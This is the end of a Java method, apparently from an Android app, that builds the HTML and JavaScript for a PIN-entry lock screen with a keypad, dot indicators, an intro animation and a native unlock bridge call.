"        <circle cx=\"17\" cy=\"22\" r=\"4\" fill=\"#ffd93d\" stroke=\"#1a1a1a\" stroke-width=\"2\"/>\n" +
"      </svg>\n" +
"    </div>\n" +
"  </div>\n" +
"  <div class=\"lock-title\">" + safeTitle + "</div>\n" +
"  <div class=\"lock-sub\">Enter Pin To Unlock</div>\n" +
"  <div class=\"pin-wrap\">\n" +
"    <div class=\"pin-dot\" id=\"d0\"></div><div class=\"pin-dot\" id=\"d1\"></div>\n" +
"    <div class=\"pin-dot\" id=\"d2\"></div><div class=\"pin-dot\" id=\"d3\"></div>\n" +
"  </div>\n" +
"  <div class=\"pin-status\" id=\"pinStatus\">by @Rizzisreal01</div>\n" +
"  <div class=\"keypad\" id=\"keypad\">\n" +
"    <div class=\"key\" data-n=\"1\"><span class=\"num\">1</span><span class=\"sub\"></span></div>\n" +
"    <div class=\"key\" data-n=\"2\"><span class=\"num\">2</span><span class=\"sub\">ABC</span></div>\n" +
"    <div class=\"key\" data-n=\"3\"><span class=\"num\">3</span><span class=\"sub\">DEF</span></div>\n" +
"    <div class=\"key\" data-n=\"4\"><span class=\"num\">4</span><span class=\"sub\">GHI</span></div>\n" +
"    <div class=\"key\" data-n=\"5\"><span class=\"num\">5</span><span class=\"sub\">JKL</span></div>\n" +
"    <div class=\"key\" data-n=\"6\"><span class=\"num\">6</span><span class=\"sub\">MNO</span></div>\n" +
"    <div class=\"key\" data-n=\"7\"><span class=\"num\">7</span><span class=\"sub\">PQRS</span></div>\n" +
"    <div class=\"key\" data-n=\"8\"><span class=\"num\">8</span><span class=\"sub\">TUV</span></div>\n" +
"    <div class=\"key\" data-n=\"9\"><span class=\"num\">9</span><span class=\"sub\">WXYZ</span></div>\n" +
"    <div class=\"key empty\"></div>\n" +
"    <div class=\"key\" data-n=\"0\"><span class=\"num\">0</span><span class=\"sub\"></span></div>\n" +
"    <div class=\"key del\" data-del=\"1\">\n" +
"      <svg width=\"26\" height=\"26\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\">\n" +
"        <path d=\"M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z\"/>\n" +
"        <line x1=\"18\" y1=\"9\" x2=\"12\" y2=\"15\"/><line x1=\"12\" y1=\"9\" x2=\"18\" y2=\"15\"/>\n" +
"      </svg>\n" +
"    </div>\n" +
"  </div>\n" +
"</div>\n" +
"<script>\n" +
"(function(){\n" +
"  var el=document.getElementById('pctNum');var start=null;var dur=2500;\n" +
"  function step(ts){if(!start)start=ts+500;var p=Math.min(1,Math.max(0,(ts-start)/dur));\n" +
"    el.textContent=Math.floor(p*100)+'%';if(p<1)requestAnimationFrame(step);}\n" +
"  requestAnimationFrame(step);\n" +
"})();\n" +
"setTimeout(function(){\n" +
"  var intro=document.getElementById('introScreen');intro.style.pointerEvents='none';\n" +
"  setTimeout(function(){intro.style.display='none';},600);\n" +
"},4500);\n" +
"(function(){\n" +
"  var stars=['★','✦','✧','⭐','✩','✪','✫'];\n" +
"  var colors=['#ffd93d','#ffb3d9','#5b8def','#4caf50','#ff4757'];\n" +
"  var c=document.getElementById('stars');\n" +
"  for(var i=0;i<18;i++){\n" +
"    var s=document.createElement('div');s.className='bg-star';\n" +
"    s.textContent=stars[Math.floor(Math.random()*stars.length)];\n" +
"    s.style.left=(Math.random()*100)+'%';\n" +
"    s.style.color=colors[Math.floor(Math.random()*colors.length)];\n" +
"    s.style.animationDuration=(8+Math.random()*10)+'s';\n" +
"    s.style.animationDelay=(Math.random()*-15)+'s';\n" +
"    s.style.fontSize=(10+Math.random()*10)+'px';\n" +
"    c.appendChild(s);\n" +
"  }\n" +
"})();\n" +
"var pin='';var blocked=false;\n" +
"var keypad=document.getElementById('keypad');\n" +
"function handleKeyPress(key){\n" +
"  if(!key||key.classList.contains('empty'))return;\n" +
"  if(blocked)return;\n" +
"  if(key.dataset.del){doDelete();return;}\n" +
"  if(key.dataset.n!==undefined){doPress(key.dataset.n);}\n" +
"}\n" +
"if(window.PointerEvent){\n" +
"  keypad.addEventListener('pointerdown',function(e){handleKeyPress(e.target.closest('.key'));});\n" +
"}else{\n" +
"  keypad.addEventListener('touchstart',function(e){handleKeyPress(e.target.closest('.key'));},{passive:true});\n" +
"  keypad.addEventListener('mousedown',function(e){handleKeyPress(e.target.closest('.key'));});\n" +
"}\n" +
"function doPress(n){\n" +
"  if(blocked||pin.length>=4)return;\n" +
"  pin+=n;updateDots();\n" +
"  if(pin.length===4)setTimeout(checkPin,150);\n" +
"}\n" +
"function doDelete(){if(blocked)return;pin=pin.slice(0,-1);updateDots();setStatus('',false,false);}\n" +
"function updateDots(){\n" +
"  for(var i=0;i<4;i++){\n" +
"    var d=document.getElementById('d'+i);\n" +
"    d.classList.toggle('filled',i<pin.length);d.classList.remove('error');\n" +
"  }\n" +
"}\n" +
"function checkPin(){\n" +
"  var ok=false;\n" +
"  try{ok=LockBridge.tryUnlock(pin);}catch(e){}\n" +
"  if(ok){\n" +
"    setStatus('PIN Benar ✓',false,true);\n" +
"    var flash=document.createElement('div');flash.className='success-flash';\n" +
"    document.body.appendChild(flash);\n" +
"    setTimeout(function(){flash.remove();},800);\n" +
"  }else{\n" +
"    setStatus('PIN Salah!',true,false);\n" +
"    for(var i=0;i<4;i++)document.getElementById('d'+i).classList.add('error');\n" +
"    blocked=true;\n" +
"    setTimeout(function(){pin='';blocked=false;updateDots();setStatus('Coba lagi',false,false);},1200);\n" +
"  }\n" +
"}\n" +
"function setStatus(msg,isErr,isOk){\n" +
"  var el=document.getElementById('pinStatus');\n" +
"  el.textContent=msg||'by @Rizzisreal01';\n" +
"  el.className='pin-status'+(isErr?' err':isOk?' ok':'');\n" +
"}\n" +
"</script>\n" +
"</body>\n" +
"</html>";
    }
}
